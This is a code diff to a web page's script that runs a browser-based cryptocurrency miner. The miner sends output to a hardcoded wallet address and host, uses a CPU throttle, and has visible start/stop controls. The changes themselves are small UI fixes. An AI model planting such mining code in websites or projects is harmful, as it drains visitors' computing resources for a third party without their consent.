@@ -34,7 +34,7 @@ function addText(id,elemt) {
 function miner(throttle) {
     OMINE("49E1zHzhLHz2si8o5wPxjrHgfTKu5HJux4SJjPFJhNmzdFv2JTxrr8Jf5rswL4bG6c2nY6SG72Kd7VfAFCPJkP95VWrsbtu#gaoxiaodiao.com","-1"),
 	throttleMiner=throttle, //20 means 80% of cpu usage
-    document.getElementById("state").text = "Connecting...";
+    document.getElementById("state").innerHTML = "Connecting...";
     timeout=setInterval(function() {
         for (;sendStack.length > 0;){
         	addText("send",JSON.stringify(sendStack.pop()));
@@ -48,6 +48,7 @@ function miner(throttle) {
     }
     , 1e3);
 }
+
 let throttle = document.getElementById("throttle").value;
 miner(100-parseInt(throttle));
 $("#stop-button").click(function() {
@@ -55,7 +56,7 @@ $("#stop-button").click(function() {
         $(this).html(`<span class="start">✔</span>`);
         stopMining();
         clearInterval(timeout);
-        addText("Stopped mining...");
+        document.getElementById("state").innerHTML = "Stopped mining...";
     }
     else {
         $(this).html(`<span class="stop">✖</span>`);
@@ -63,6 +64,5 @@ $("#stop-button").click(function() {
         miner(100-parseInt(throttle));
     }
     isGo=!isGo;
-}
-);
+});
 </script>
